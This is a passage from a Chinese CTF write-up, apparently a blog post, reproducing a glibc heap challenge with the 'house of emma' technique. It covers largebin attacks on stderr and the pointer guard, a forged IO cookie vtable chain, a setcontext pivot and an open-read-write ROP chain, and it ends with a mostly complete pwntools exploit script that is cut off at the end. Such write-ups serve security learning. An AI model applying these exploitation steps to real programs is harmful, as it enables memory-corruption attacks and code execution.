title="利用思路"></a>利用思路</h3><p>存在UAF，可多次进行largbin attack</p><p>无法改写为任意地址，无法直接house of kiwi，考虑house of emma</p><ul><li><p>泄露libc、heap基址</p></li><li><p>两次largbin attack改写<code>stderr</code>和<code>__pointer_chk_guard</code></p></li><li><p>合理伪造stderr与IO链</p></li><li><p>触发<code>__malloc_assert</code></p></li></ul><h2 id="堆布局与largbin-attack"><a href="#堆布局与largbin-attack" class="headerlink" title="堆布局与largbin attack"></a>堆布局与largbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#获取libc基址</span></span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + <span class="number">0x3c0740</span> + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure><p>free掉任意一个unsorted bin可获取libc基址</p><blockquote><p>问题：这里的chunk 0为什么能保持在unsorted bin中，而没有在循环开始malloc0x2000时放入large bin？</p><p>因为chunk 0和0x2000紧邻，每次完成循环都会触发合并，并在分配时被切下来</p></blockquote><p>构造0&lt;2，free掉后申请一块较小的chunk，将2放入largebin以获取heap基址</p><p>注意输出存在截断，可以先把2的fd,bk部分填满，事后记得要修复</p><p>注意largbin大小0x440~0x480为一个范围，为后续largebin attack起见，应注意预留大小</p><h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attack的利用方式：</p><ol><li>将一个较大的、largebin中的chunk的bk_nextsize覆盖为[target-0x20]</li><li>将一个较小的chunk放入<strong>同一个</strong>largebin，触发unlink</li><li>此时[target]的内容被修改为较小chunk的地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)<span class="comment">#构造的同时顺便修复</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>将5free掉，放入largebin，打出一次attack，修改stderr</p><p>又通过7将5申请回来，（这里申请之前没有修复，导致stderr指向了2）</p><p>随后再更改2，再free掉7（5），打出第二次attack，修改point_guard</p><h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>该值存在于fs:0x30</p><p>tls基址查看方式为<code>fsbase</code>或<code>tls</code>（pwngdb)，加上0x30即为guard值</p><p>也可以直接用gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0</span> </span><br><span class="line">(gdb) x /gx $rsp - 0x8</span><br><span class="line">0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE</span><br></pre></td></tr></table></figure><p>本地gdb调试时该值与libc偏移可能改变，调试时可以先关闭aslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h3 id="修复largebin与准备触发-malloc-assert"><a href="#修复largebin与准备触发-malloc-assert" class="headerlink" title="修复largebin与准备触发__malloc_assert"></a>修复largebin与准备触发__malloc_assert</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>先分别修补两个largebin，防止分配时发生错误</p><p>申请8填补5,申请9填补2</p><p>将最外层的chunk 6 free掉，加入unsorted bin并与top chunk合并</p><p>再申请一块略小于6的chunk 10，通过修改chunk 6的内容修改top chunk的size段</p><p>此处改为0x10使之页不对齐</p><p>后面只需要申请一个chunk就可以触发<code>__malloc_assert</code></p><h2 id="构造IO利用链"><a href="#构造IO利用链" class="headerlink" title="构造IO利用链"></a>构造IO利用链</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>假设我们控制了<code>stderr</code>，进入了<code>_IO_cookie_write</code>，调用函数指针<code>write_cb</code>，此时我们只能控制进入函数时的<code>rdi</code>，而控制<code>setcontext</code>需要控制rdx</p><p>碰巧有一个gadget，能够利用<code>rdi</code>控制<code>rdx</code>，还能call一个和<code>rdx</code>相关的地址</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br></pre></td></tr></table></figure><h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>进入<code>__malloc_assert</code>后，利用<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>调用链</p><p>需要满足<code>_IO_write_ptr &gt; _IO_write_base</code>，且<code>_lock</code>指向可写地址，此处直接使用原地址<code>_IO_stdfile_2_lock</code></p><p><code>vtable</code>需要伪造，触发IO时，原本指向<code>_IO_file_jumps -&gt; __xsputn</code>，即<code>&lt;__GI__IO_file_jumps+56&gt;</code>，需要伪造为<code>_IO_cookie_jumps-&gt; __write</code>，即<code>&lt;_IO_cookie_jumps+120&gt;</code>，故此处填上<code>_IO_cookie_jumps+0x40</code></p><p>构造<code>__cookie</code>为chunk 0的地址，注意为了方便更改，地址加上0x10，之后chunk 0的用户地址会进入<code>rdi</code></p><p>构造<code>cookie_write_function_t *write</code>处指针为gadget地址，调用时直接运行gadget，此处有加密</p><h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>修改chunk 0，使rdx指向chunk5</p><h3 id="布置rdx附近满足setcontext"><a href="#布置rdx附近满足setcontext" class="headerlink" title="布置rdx附近满足setcontext"></a>布置rdx附近满足setcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>根据setcontext+61，布置<code>rdx</code>周围，使寄存器满足条件</p><p><code>rsp</code>指向chunk 1，<code>rcx</code>指向ret，将栈迁移到chunk 1上</p><h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line">tls_offset = <span class="number">0x3c0740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span 